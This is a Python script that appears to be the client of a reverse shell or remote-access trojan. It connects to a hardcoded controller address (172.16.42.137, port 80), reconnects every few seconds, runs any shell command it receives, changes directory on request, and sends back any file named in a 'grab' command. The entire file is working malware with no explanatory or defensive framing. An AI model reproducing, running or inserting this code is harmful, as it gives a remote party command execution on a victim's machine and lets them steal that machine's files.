import socket
import subprocess
import shlex
import os
import time

HOST = "172.16.42.137"
PORT = 80

def execute(command):
    cmd = command.strip()
    if not cmd:
        return
    
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

def transfer(connection, path):
    if not os.path.exists(path):
        connection.send('File not found'.encode())
        return
    
    try:
        with open(path, 'rb') as f:
            packet = f.read(1024)

            while packet:
                connection.sendall(packet)
                packet = f.read(1024)
            
            connection.send(b'DONE')
    except Exception as e:
        msg = f'{str(e)} DONE'
        connection.send(msg.encode())

def execute_command(s, cmd):
    output = execute(cmd)
    try:
        if output:
            s.send(output.encode())
        else:
            s.send('done'.encode())
    except BrokenPipeError as bpe:
        print('[-] Host disconnected')
        exit(1)
    except KeyboardInterrupt as ke:
        print('\n[+] Exiting ...')
        exit() 
    except Exception as e:
        print('[-] Connection Lost')
        exit()

def changedir(command, s):
    command, dirpath = command.split(' ')
    os.chdir(dirpath)
    s.send((f'[+] Directory changed to {os.getcwd()}').encode())

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
        while True:
            cmd = s.recv(4096)
            cmd = cmd.decode()

            if 'terminate' in cmd:
                s.close()
                return
            elif 'cd' in cmd:
                changedir(cmd, s)
            elif 'grab' in cmd:
                grab, path = cmd.split('*')
                transfer(s, path)
            else:
                execute_command(s, cmd)

    except ConnectionRefusedError as e:
        print('[-] Host is down')
        s.close()
    except ConnectionAbortedError as e:
        print('[-] Host disconnected')
        s.close()
    except Exception as e:
        print('[-] Connection closed')
        s.close()
        
def run():
    while True:
        if connect() == 1:
            break        

        time.sleep(3)

if __name__ == "__main__":
    run()
